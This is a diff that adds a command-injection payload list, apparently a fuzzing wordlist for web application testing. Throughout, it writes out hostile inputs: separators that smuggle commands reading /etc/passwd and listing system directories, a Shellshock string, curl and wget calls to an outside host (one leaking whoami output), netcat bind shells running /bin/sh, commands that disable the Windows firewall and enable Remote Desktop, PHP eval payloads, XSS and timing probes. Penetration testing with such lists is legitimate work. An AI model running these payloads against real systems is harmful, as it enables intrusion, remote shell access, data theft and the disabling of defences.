@@ -1,0 +1,161 @@
+|/bin/ls -al
+system('cat%20/etc/passwd')
+system('id')
+system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+;netstat -a;
+;system('cat%20/etc/passwd')
+|/usr/bin/id
+|usr/bin/id\n
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+| curl http://crowdshield.com/.testing/rce.txt
+& curl http://crowdshield.com/.testing/rce.txt
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt
+ curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+; dir
+& dir
+&&dir
+&& dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+| dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+| dir C:\Users
+; dir C:\Users
+& dir C:\Users
+&& dir C:\Users
+;echo%20'<script>alert(1)</script>'
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+ipconfig
+| ipconfig /all
+; ipconfig /all
+& ipconfig /all
+&& ipconfig /all
+ipconfig /all
+| ls -l /
+; ls -l /
+& ls -l /
+&& ls -l /
+| ls -laR /etc
+; ls -laR /etc
+& ls -laR /etc
+&& ls -laR /etc
+| ls -laR /var/www
+; ls -laR /var/www
+& ls -laR /var/www
+&& ls -laR /var/www
+| ls -l /etc/
+; ls -l /etc/
+& ls -l /etc/
+&& ls -l /etc/
+| ls -l /home/*
+; ls -l /home/*
+& ls -l /home/*
+&& ls -l /home/*
+*; ls -lhtR /var/www/
+| ls -l /tmp
+; ls -l /tmp
+& ls -l /tmp
+&& ls -l /tmp
+| ls -l /var/www/*
+; ls -l /var/www/*
+& ls -l /var/www/*
+&& ls -l /var/www/*
+ls -l /var/www/*
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\n/bin/ls -al\n
+| nc -lvvp 4444 -e /bin/sh|
+; nc -lvvp 4444 -e /bin/sh;
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+| netsh firewall set opmode disable
+; netsh firewall set opmode disable
+& netsh firewall set opmode disable
+&& netsh firewall set opmode disable
+| netstat -an
+; netstat -an
+& netstat -an
+&& netstat -an
+\n/usr/bin/id\n
+perl -e 'print "X"x1024'
+|| perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+perl -e 'print "X"x16384'
+; perl -e 'print "X"x2048'
+& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x2048'
+perl -e 'print "X"x2048'
+|| perl -e 'print "X"x4096'
+| perl -e 'print "X"x4096'
+; perl -e 'print "X"x4096'
+& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x4096'
+perl -e 'print "X"x4096'
+|| perl -e 'print "X"x8096'
+| perl -e 'print "X"x8096'
+; perl -e 'print "X"x8096'
+&& perl -e 'print "X"x8096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+;${@print(md5(RCEVulnerable))};
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+| pwd
+; pwd
+& pwd
+&& pwd
+| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+| sleep 1
+; sleep 1
+& sleep 1
+&& sleep 1
+|| sleep 10
+| sleep 10
+; sleep 10
+{${sleep(10)}}
+& sleep 10
+&& sleep 10
+|| sleep 15
+| sleep 15
+; sleep 15
+& sleep 15
+&& sleep 15
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+| sleep 5
+; sleep 5
+& sleep 5
+&& sleep 5
+ {${sleep(hexdec(dechex(20)))}}
+{${sleep(hexdec(dechex(20)))}}
+sysinfo
+| sysinfo
+; sysinfo
+& sysinfo
+&& sysinfo
